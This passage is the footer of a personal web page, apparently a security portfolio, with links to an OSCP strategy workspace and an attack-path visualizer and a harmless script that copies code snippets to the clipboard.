href="/tools/oscp/" aria-current="page" data-astro-cid-jo6i4kqk>OSCP strategy workspace <span aria-hidden="true" data-astro-cid-jo6i4kqk>↗</span></a><a href="/tools/attack-path/" data-astro-cid-jo6i4kqk>Attack-path visualizer <span aria-hidden="true" data-astro-cid-jo6i4kqk>↗</span></a></nav><div class="footer-meta" data-astro-cid-jo6i4kqk><p data-astro-cid-jo6i4kqk>© 2026 Armaan. Built with curiosity.</p><div data-astro-cid-jo6i4kqk><a href="https://github.com/ArmaanLeg3nd" target="_blank" rel="noreferrer" data-astro-cid-jo6i4kqk>GitHub ↗</a><span data-astro-cid-jo6i4kqk>GMT+8</span></div></div></div></footer><script type="module" src="/_assets/MotionController.astro_astro_type_script_index_0_lang.BuT1diwy.js"></script></body></html><script type="module">function e(){document.querySelectorAll(`[data-reference-copy]`).forEach(e=>{e.dataset.ready||(e.dataset.ready=`true`,e.addEventListener(`click`,async()=>{let t=e.parentElement?.querySelector(`code`);if(t){try{await navigator.clipboard.writeText(t.textContent||``),e.textContent=`Copied`}catch{e.textContent=`Select and copy`}window.setTimeout(()=>e.textContent=`Copy`,1600)}}))})}e(),document.addEventListener(`astro:page-load`,e);</script>
